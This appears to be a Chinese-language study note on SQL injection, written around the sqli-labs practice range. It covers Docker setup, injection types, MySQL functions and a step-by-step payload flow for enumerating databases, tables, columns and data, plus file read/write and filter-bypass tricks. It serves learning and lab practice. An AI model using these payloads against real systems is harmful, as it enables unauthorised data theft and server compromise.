# SQL注入

###       0x01 环境需求

                    [SQLi在线靶场](https://sqli-labs.htctf.com/)、[SQLi Github](https://github.com/Audi-1/sqli-labs)、Docker\(镜像\)、Hackbar插件、域名采集器、Google Hack  
                    docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs  
                    docker exec -it imageID /bin/bash  
                    run 运行 -dt 守护进程 --name 别名 --rm 停止运行删除进程

###       0x02 关于SQLinject

                    **SQL:** 是一门ANSI标准的计算机语言，用来**访问**和**操作**数据库系统，SQL语句用来取回和更新数据库中的数据  
                    **原因:** 开发人员对从web表单、cookie、输入参数等收到的值传递给SQL查询之前进行过滤控制  
                    **原理:** SQL代码插入或添加到应用\(用户\)的输入参数中，并且参数在后台SQL服务器中解析和执行  
                    **危害:** 获取数据库内容、读取文件信息、Getshell\(root权限\)  
![](/assets/QQ20190218-174536@2x.png)

###       0x03 注入类型

                      **1.按注入位置:**  
![](/assets/WX20190307-142137@2x.png)  
                      **2.按参数类型:**   
![](/assets/WX20190307-143314@2x.png)  
                    **PS: 搜索型注入:** and '%1'='%1，select _ from users where name like '%tom%'  
                      \*3.按返回结果:_回显注入、无显注入

###       0x04 查看数据库类型

                    **报错显示**:  
![](/assets/QQ20190218-181926@2x.png)  
![](/assets/QQ20190218-181837@2x.png)

###       0x05 函数语句

```sql
    数据库: database()          用户: user()  
    数据库版本: version()
    数据库路径: @@datadir
    操作系统: @@version_compile_os

    查询列数: order by,采用二分法
    联合查询: union,注意列数匹配
    连接函数: concat(),concat_ws(),group_concat()，前两者返回一个数据，后者返回数列

    写文件: into outfile PATH，函数前构建文件   
    读文件: load_file(PATH)  

    /**/或者%a0代替空格、%27代表 '
```

###       0x06 注入流程\(MySQL\)

```sql
    判断注入点: '  and 1=1/2  or 1=1/2,看页面反馈,但是使用or判断时,要设置为错误参数
    查询列数: order by 
    核心注入句:
        查库: select schema_name from information_schema.schemata
        查表: select table_name from information_schema.tables where table_schema='库名'
        查列: select column_name from information_schema.columns where table_name='表名'
        查数据: select 列 from 库名.表名
```



